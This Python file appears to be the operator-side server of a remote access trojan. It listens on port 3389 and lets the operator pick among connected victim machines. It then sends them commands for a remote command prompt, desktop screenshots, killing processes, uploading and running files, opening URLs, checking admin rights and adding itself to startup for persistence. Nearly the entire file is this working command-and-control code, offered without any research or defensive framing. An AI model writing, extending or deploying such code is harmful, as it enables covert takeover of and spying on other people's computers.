import os
import io
import sys
import time

import socket
import threading
import validators

from PIL import Image


HOST = "0.0.0.0"
PORT = 3389

# Server Available Commands
commands = {
    "check_admin": "Checks if the client has admin permissions.",
    "client": "Switch to a different client.",
    "cls": "Clears the terminal screen.",
    "cmd": "Enter Command Prompt on client.",
    "help": "Lists available commands.",
    "kill_proc <pid>": "Terminate a process by it's PID.",
    "list_ports <-e, -l>": "List client ports. (-e: established, -l: listening, no argument to show all).",
    "list_proc": "Displays running processes on the client.",
    "netinfo": "Fetches client IP and MAC address.",
    "open_url <url_address>": "Open a URL in the client's default browser.",
    "run <file_path>": "Execute a file or app on the client.",
    "screenshot": "Capture a screenshot of the client desktop",
    "startup": "Add program to run at startup",
    "sys_info": "Retrieve client system information.",
    "upld <source_file> <destination_filepath>": "Upload a file from your PC to the client.",
}

connected_clients = []
selected_client = None  # No client selected on start

cmd_mode_enabled = False  # Is CMD mode enabled

accept_commands = True  # Can accept new commands
await_client_connections = True  # Can accept new clients

closing_program = False  # Is user closing program?


clear_event = threading.Event()
list_clients_running = threading.Event()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create socket for server
server.bind((HOST, PORT))  # Bind HOST / PORT for server
server.listen(5)  # Listen for up to 5 connections


def clear_screen():
    # Clears screen for user, and threaded tasks
    os.system("cls")
    clear_event.set()
    clear_event.clear()


#################################################################################

# LISTEN FOR CLIENTS | UPDATE CLIENT LIST #

#################################################################################


def listen_for_clients():
    global connected_clients, await_client_connections

    print(f"[LISTENING] Server is listening at {HOST} on port {PORT}...")
    time.sleep(2)

    while await_client_connections:
        try:
            client_socket, client_address = server.accept()
            connected_clients.append((client_socket, client_address))
            print(f"[NEW CONNECTION] {client_address} connected.")
            time.sleep(0.5)
            refresh_client_list()
        except Exception as e:
            print(f"[ERROR] {e}")


def check_for_disconnections():
    global connected_clients

    while await_client_connections:
        time.sleep(0.5)  # Check every .5 seconds
        for client_socket, client_address in connected_clients[:]:
            try:
                client_socket.send(b"\x00")  # Heartbeat check
            except (socket.error, BrokenPipeError):
                print(f"[DISCONNECTED] {client_address} removed.")
                time.sleep(0.5)
                connected_clients.remove((client_socket, client_address))
                refresh_client_list()


def refresh_client_list():
    if list_clients_running.is_set():
        clear_screen()
        display_clients()


def display_clients():
    print("[CONNECTIONS]")
    print("*" * 50)

    if connected_clients:
        for i, (client_socket, client_address) in enumerate(connected_clients):
            print(f"{i+1}. {client_address}")
    else:
        print("[WAITING] No clients connected...")

    print("*" * 50)
    print("\nSelect a client to use for this session or 'exit' to shutdown the server.")
    print("\nSelection: ", end="", flush=True)


def list_connected_clients():
    global selected_client, await_client_connections, connected_clients, client_socket

    if list_clients_running.is_set():
        return  # Prevent multiple instances
    list_clients_running.set()

    # Actively check for disconnected clients before showing the list
    for client_socket, client_address in connected_clients[:]:
        try:
            client_socket.send(b"\x00")  # Send a test byte (ping)
        except (socket.error, BrokenPipeError):
            print(f"[DISCONNECTED] {client_address} removed.")
            time.sleep(0.5)
            connected_clients.remove((client_socket, client_address))

    while await_client_connections:
        clear_screen()
        display_clients()

        select_client_input = input().strip().lower()

        if select_client_input == "exit":
            close_server()

        try:
            selected_index = int(select_client_input) - 1
            if 0 <= selected_index < len(connected_clients):
                selected_client = selected_index
                client_socket, client_address = connected_clients[selected_client]
                print(
                    f"[SELECTED] Client {client_address} will be used for this session."
                )
                await_client_connections = False
                time.sleep(1)
                list_commands(client_socket, client_address, server)
                break
            else:
                print("[ERROR] Selection not in range. Try again.")
                time.sleep(1)
                continue

        except ValueError:
            print("[ERROR] Invalid selection. Try again.")
            time.sleep(1)

    list_clients_running.clear()


#################################################################################

# LIST COMMANDS #

#################################################################################


def list_commands(client_socket, client_address, server):
    global accept_commands

    clear_screen()

    # Display all available commands and descriptions
    print("Available commands:\n")
    print(f"{'Command':<20} {'Description'}")
    print("*" * 50)

    for command, description in commands.items():
        print(f"{command:<20} {description}")
    print("*" * 50)

    # After displaying commands, await user input
    accept_commands = True
    listen_for_commands(client_socket, client_address, server)


#################################################################################

# HANDLE USER INPUT AND COMMANDS #

#################################################################################


# Receive responses correctly from client with same buffer size for all commands
def recv_response(client_socket, bufsize=20480):
    # Receiving responses from client, ensure they're valid | Set default buff size 20480
    while True:
        data = client_socket.recv(bufsize)
        if not data:
            return data
        # If data is just a heartbeat (you can adjust this check as needed)
        if data == b"\x00":
            continue
        return data


def handle_command(command, client_socket, client_address, server):
    global cmd_mode_enabled, webcam_enabled, accept_commands
    try:
        # Handle CMD commands for entering command prompt mode
        if command.lower() == "cmd":
            # Try to enter CMD mode and handle Windows commands
            try:
                if not cmd_mode_enabled:
                    client_socket.sendall(b"cmd_on")
                    cmd_mode_enabled = True
                    client_output = recv_response(client_socket).decode(errors="ignore")
                    print(client_output)
                    cmd_mode(client_socket, client_address, server)
                # Handle if cmd mode is enabled but still inside this loop
                else:
                    client_socket.sendall(b"cmd_off")
                    cmd_mode_enabled = False
                    client_output = recv_response(client_socket).decode(errors="ignore")
                    print(client_output)
            # Handle client disconnection
            except (socket.timeout, ConnectionResetError, BrokenPipeError):
                client_disconnected(client_socket, exit=False)

        ################################################
        # HANDLE CUSTOM USER COMMANDS #
        ################################################

        # Handle sys_info command
        elif command.lower() == "sys_info":
            client_socket.sendall(command.encode())
            client_output = recv_response(client_socket).decode(errors="ignore")
            print(client_output)

        # Handle list processes command
        elif command.lower() == "list_proc":
            client_socket.sendall(command.encode())

            process_list = recv_response(client_socket).decode(errors="ignore")
            print("\nActive Processes:\n" + process_list)

        # Handle kill process command
        elif command.lower().startswith("kill_proc"):
            client_socket.sendall(command.encode())

            response = recv_response(client_socket).decode(errors="ignore")
            print(response)

        # Handle list ports command
        elif command.lower().startswith("list_ports"):
            print("Requesting list of ports from client...")
            client_socket.sendall(command.encode())
            ports_data = recv_response(client_socket).decode(errors="ignore")
            print(ports_data)

        # Handle upload file command
        elif command.lower().startswith("upld"):
            handle_upload_command(command, client_socket)

        # Handle run file/application command
        elif command.lower().startswith("run"):
            run_args = command.split(" ", 1)
            if len(run_args) != 2:
                print("[OPEN] Invalid open command. Usage: open <file_to_open_path>")
            if len(run_args) == 2:
                client_socket.sendall(command.encode())
                run_response = recv_response(client_socket).decode(errors="ignore")
                print(run_response)

        # Handle open URL command
        elif command.lower().startswith("open_url"):
            url_args = command.split(" ", 1)
            if len(url_args) != 2:
                print(
                    "[OPEN_URL] Invalid open_url command. Usage open_url <url_to_open>"
                )
            if len(url_args) == 2:
                url = url_args[1]
                if not url:
                    print(
                        "[OPEN_URL] Invalid open_url command. Usage: open_url <url_to_open>"
                    )
                else:
                    if is_valid_url(url):
                        client_socket.sendall(command.encode())
                        open_url_response = recv_response(client_socket).decode(
                            errors="ignore"
                        )
                        print(open_url_response)
                    else:
                        print("[OPEN_URL] Invalid URL, cannot be opened.")

        # Handle desktop screenshot command
        elif command.lower() == "screenshot":
            client_socket.sendall(command.encode())
            receive_desktop_screenshot(client_socket)

        # Handle network info command
        elif command.lower() == "netinfo":
            client_socket.sendall(command.encode())
            net_info = recv_response(client_socket).decode(errors="ignore")
            print(net_info)

        # Handle check admin command
        elif command.lower() == "check_admin":
            client_socket.sendall(command.encode())
            response = recv_response(client_socket).decode(errors="ignore")
            print(response)

        # Handle startup command
        elif command.lower() == "startup":
            client_socket.sendall(command.encode())
            response = recv_response(client_socket).decode(errors="ignore")
            print(response)

        ################################################
        # HANDLE ALL OTHER COMMANDS
        ################################################

        # If command doesn't match any custom command -> Send command to client to run in cmd mode or throw an error
        else:
            client_socket.sendall(command.encode())
            client_output = recv_response(client_socket).decode(errors="ignore")
            print(client_output)

    # Handle client disconnection
    except (socket.timeout, ConnectionResetError, BrokenPipeError) as e:
        print(f"[ERROR] {e}")
        time.sleep(0.5)
        client_disconnected(client_socket, exit=False)


def listen_for_commands(client_socket, client_address, server):
    global accept_commands, cmd_mode_enabled

    # Loop while server can listen for commands
    while accept_commands:
        try:
            # If no client is selected / If client disconnects
            if client_socket is None:
                client_disconnected(client_socket, exit=False)
                break

            client_socket.setblocking(True)

            print("\nEnter a command: ", end="", flush=True)
            command = input().strip()  # Immediately await input

            if not command:
                continue

            # If user chooses to exit, skip all commands
            if command.lower() == "exit":
                client_disconnected(client_socket, exit=True)

            # If user chooses to select another client
            if command.lower() == "client":
                client_disconnected(client_socket, exit=False)
                continue

            # If user chooses to list commands
            if command.lower() == "help" and not cmd_mode_enabled:
                list_commands(client_socket, client_address, server)
                continue

            # If user chooses to clear screen
            if command.lower() == "cls":
                clear_screen()
                continue

            else:
                handle_command(command, client_socket, client_address, server)

        except (socket.timeout, ConnectionResetError, BrokenPipeError) as e:
            print(f"Error: {str(e)}")
            client_disconnected(client_socket, exit=False)


#################################################################################

# CUSTOM INPUT COMMANDS #

#################################################################################


def cmd_mode(client_socket, client_address, server):
    global selected_client, cmd_mode_enabled

    # Print beginning help options for user

    print("\n[CMD MODE] Type a Windows CMD command, or 'cmd' to exit.")
    print(
        "\n[CMD MODE] Change directories by using 'cd' followed by the directory ('C:\\') or appended folder name."
        "\nSee documentation for more information."
    )

    # Initialize cwd from the client
    client_socket.sendall(b"cwd")  # Request the current directory from the client
    cwd = (
        recv_response(client_socket).decode(errors="ignore").strip()
    )  # Receive the initial cwd
    current_prompt = f"{cwd}> "  # Set prompt correctly

    # Loop through and handle all further commands
    while cmd_mode_enabled:
        cmd_input = input(current_prompt).strip()  # Get input

        try:
            if not cmd_input:  # If user presses enter without a command, do nothing
                continue

            # If user chooses to exit, skip all commands
            if cmd_input.lower() == "exit":
                cmd_mode_enabled = False
                client_disconnected(client_socket, exit=True)
                break

            if cmd_input.lower() == "cmd":
                client_socket.sendall(b"cmd_off")
                cmd_mode_enabled = False
                response = recv_response(client_socket).decode(errors="ignore")
                print(response)
                break

            # Send command to the client
            client_socket.sendall(cmd_input.encode())

            if cmd_input.lower().startswith("cd "):
                cwd = recv_response(client_socket).decode(errors="ignore")
                cmd_response = cwd

                # Update prompt
                current_prompt = f"{cwd}> "
                continue

            else:
                cmd_response = recv_response(client_socket).decode(errors="ignore")
                time.sleep(0.25)
                if not cmd_response:
                    continue  # No response, move to next iteration

                else:
                    print(cmd_response)

        except (socket.timeout, ConnectionResetError, BrokenPipeError):
            client_disconnected(client_socket, exit=False)


def handle_upload_command(command, client_socket):
    # Handle upload file command. Takes 2 arguments <source_filepath> as path on server machine and <destination_filepath> as path on client machine.
    try:
        upld_parts = command.split(" ", 2)

        # Check if command has correct number of arguments
        if len(upld_parts) != 3:
            print(
                "[UPLD] Invalid 'upld' command. Usage: upld <source_filepath> <destination_filepath>"
            )
            return

        source_filepath = upld_parts[1].strip()  # File location on server
        destination_filepath = upld_parts[
            2
        ].strip()  # Destination file on client machine

        # Check if source file exists
        if not os.path.exists(source_filepath):
            print(f"[ERROR] Source file '{source_filepath}' not found.")
            return

        # Send command to client
        upload_request = f"upld {source_filepath} {destination_filepath}"
        client_socket.sendall(command.encode())

        client_response = recv_response(client_socket).decode(errors="ignore")

        # Print response from client
        print(client_response)
    except (socket.timeout, ConnectionResetError, BrokenPipeError, Exception) as e:
        print(f"[ERROR] Failed to handle upload command: {e}")
        time.sleep(0.5)
        client_disconnected(client_socket, exit=False)


# URL validation check
def is_valid_url(url):
    return validators.url(url)


def receive_desktop_screenshot(client_socket):
    # Receive the length of the screenshot data
    data_len = int.from_bytes(client_socket.recv(4), "big")

    # Receive the screenshot data
    screenshot_data = b""
    while len(screenshot_data) < data_len:
        screenshot_data += client_socket.recv(1024)

    # Convert byte data to image
    img = Image.open(io.BytesIO(screenshot_data))

    # Display the screenshot
    img.show()


#################################################################################

# CLOSING CONNECTIONS #

#################################################################################


def close_server():
    global await_client_connections, selected_client
    await_client_connections = False

    clear_screen()

    # Close server socket only if still open
    if server.fileno() != -1:
        server.close()
    sys.exit(0)


def client_disconnected(client_socket, exit):
    global selected_client, cmd_mode_enabled, accept_commands, await_client_connections, connected_clients

    if exit:
        if server.fileno() != -1:
            close_server()
        sys.exit(0)

    # Try to tell client to exit and listen for server again
    if client_socket:
        try:
            client_socket.sendall(b"exit")
        except (socket.error, BrokenPipeError):
            pass

    # Reset all variables
    connected_clients = [
        client for client in connected_clients if client[0] != client_socket
    ]

    # Clear screen tell server client disconnected
    clear_screen()
    print("[ERROR] Client disconnected")
    clear_screen()

    if exit:
        # Close server socket only if still open
        if server.fileno() != -1:
            server.close()
        exit(0)
    else:
        # Restart listener thread to allow new connections
        await_client_connections = True
        list_clients_running.clear()  # Ensure fresh list of clients is created
        list_connected_clients()  # Return to client selection screen


# Start listening for clients
listen_thread = threading.Thread(target=listen_for_clients, daemon=True)
disconnect_thread = threading.Thread(target=check_for_disconnections, daemon=True)

listen_thread.start()
disconnect_thread.start()

list_connected_clients()
